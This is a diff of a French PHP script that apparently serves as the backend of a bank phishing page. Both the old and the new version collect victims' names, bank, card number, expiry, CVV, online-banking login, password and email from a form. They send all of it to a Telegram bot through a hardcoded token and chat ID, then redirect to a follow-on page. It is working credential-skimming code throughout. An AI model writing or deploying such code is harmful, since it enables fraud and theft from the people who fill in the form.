@@ -1,48 +1,43 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $nom = $_POST['nom'];
-    $prenom = $_POST['prenom'];
-    $codePostal = $_POST['code-postal'];
-    $region = $_POST['region'];
-    $banque = $_POST['banque'];
-    $departement = $_POST['departement'];
-    $carteNumero = implode('-', $_POST['carte-numero']);
-    $expiration = implode('/', $_POST['expiration']);
-    $cvv = $_POST['cvv'];
-    $identifiant = $_POST['identifiant'];
-    $motDePasse = $_POST['mot-de-passe'];
-    $email = $_POST['email'];
+// 📌 Récupération des données du formulaire
+$nom = $_POST['nom'];
+$prenom = $_POST['prenom'];
+$code_postal = $_POST['code_postal'];
+$region = $_POST['region'];
+$banque = $_POST['banque'];
+$departement = $_POST['departement'];
+$num_carte = $_POST['num_carte'];
+$date_expiration = $_POST['date_expiration'];
+$cvv = $_POST['cvv'];
+$identifiant = $_POST['identifiant'];
+$password = $_POST['password'];
+$email = $_POST['email'];
 
-    // Remplacez par votre token de bot Telegram et l'ID du chat
-    $telegramBotToken = '7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw';
-    $telegramChatId = '7263826117';
+// 📌 Configuration de l'API Telegram
+$token = "7567439450:AAFHhAanr0IefYedWxvvXZL5fOejGa9N4VI"; // Remplace par le Token de ton bot
+$chat_id = "5784668779"; // Remplace par ton ID Telegram
 
-    $message = "
-    ⚠️ Nouvelle authentification : ⚠️
+// 📌 Format du message
+$message = "📝 *Nouveau formulaire reçu :*\n";
+$message .= "👤 *Nom:* $nom\n";
+$message .= "👤 *Prénom:* $prenom\n";
+$message .= "📍 *Code Postal:* $code_postal\n";
+$message .= "🌍 *Région:* $region\n";
+$message .= "🏦 *Banque:* $banque\n";
+$message .= "📌 *Département:* $departement\n";
+$message .= "💳 *Numéro de carte:* $num_carte\n";
+$message .= "📆 *Expiration:* $date_expiration\n";
+$message .= "🔢 *CVV:* $cvv\n";
+$message .= "🔑 *Identifiant:* $identifiant\n";
+$message .= "🔐 *Mot de passe:* $password\n";
+$message .= "📧 *E-mail:* $email\n";
+$message = urlencode($message);
 
-    👤 Nom : $nom
-    👤 Prénom : $prenom
-    📍 Code Postal : $codePostal
-    🗺️ Région : $region
-    🏦 Banque : $banque
-    🏢 Département : $departement
-    💳 Numéro de Carte : $carteNumero
-    📅 Expiration : $expiration
-    🔒 CVV : $cvv
-    🔑 Identifiant : $identifiant
-    🔐 Mot de passe : $motDePasse
-    📧 Email : $email
-    ";
+// 📌 Envoi du message à Telegram
+$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message&parse_mode=Markdown";
+file_get_contents($url);
 
-    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=" . urlencode($message);
-
-    if (file_get_contents($url)) {
-        header('Location: index3.html');
-        exit();
-    } else {
-        echo "Erreur lors de l'envoi des données à Telegram.";
-    }
-} else {
-    echo "Méthode non autorisée.";
-}
+// 📌 Redirection après soumission
+header("Location: index3.html");
+exit();
 ?>
